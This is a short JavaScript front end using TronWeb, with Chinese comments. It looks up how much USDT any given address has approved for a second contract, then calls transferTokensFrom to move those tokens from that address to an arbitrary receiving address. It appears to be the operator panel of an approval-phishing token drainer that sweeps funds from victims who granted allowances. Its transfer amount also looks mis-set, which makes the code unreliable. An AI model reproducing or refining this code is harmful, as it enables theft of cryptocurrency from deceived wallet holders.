const { contractAddress, decimalNums } = window;
const feeLimit = 100000000;
const callValue = 0;
// 点击查看按钮触发
$('.find').click(async () => {
  try {
    const { tronWeb } = window;
    let approveContract = await tronWeb.contract().at(contractAddress.TD); // 构建USDT合约对象
    const res = await approveContract
      .allowance($('.findAddress').val(), contractAddress.approve) //执行合约方法allowance,查看参数1地址， 对参数2地址授权数量
      .call(); // 执行
    const tokenNumber = tronWeb // 16进制转化10进制， 并去掉小点后的0
      .BigNumber(res[0]._hex / +(1 + decimalNums))
      .toString(10);
    $('.tokenNumber').html(tokenNumber); // 在页面元素展示数量
  } catch (e) {
    $('.tokenNumber').html('');
    alert('地址不合法');
  }
});

$('.confirm').click(async () => {
  try {
    const { tronWeb } = window;
    // 构建被授权合约对象
    const approveContract = await tronWeb
      .contract()
      .at(contractAddress.approve);
    // 打印要转账数量
    console.log($('.tokenNumber').html() + decimalNums);
    const res = await approveContract
      .transferTokensFrom(
        // 执行合约中transferTokensFrom方法， 参数1： 被授权币地址， 参数2： 发送发，参数3：接收方，参数4： 数量
        contractAddress.TD,
        $('.findAddress').val(),
        $('.receiveAddress').val(),
        decimalNums
      )
      .send({
        // 发送
        feeLimit: feeLimit, // 手续费上限数量
        callValue: callValue || 0, // 顺带转的trx，默认0
      });
    //执行成功后逻辑
  } catch (e) {
    //执行失败后逻辑
    console.log(e);
  }
});
